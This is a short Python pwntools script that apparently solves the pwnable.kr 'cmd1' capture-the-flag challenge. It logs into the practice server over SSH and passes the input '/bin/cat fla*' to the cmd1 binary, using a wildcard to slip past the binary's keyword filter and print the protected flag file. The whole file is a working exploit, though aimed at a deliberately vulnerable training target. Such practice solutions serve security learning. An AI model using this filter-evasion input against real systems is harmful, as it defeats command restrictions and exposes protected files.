from pwn import *

session = ssh(host='pwnable.kr', user='cmd1', port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1":""})

io.sendline("./cmd1 '/bin/cat fla*'")
print(io.recvrepeat(1).decode())
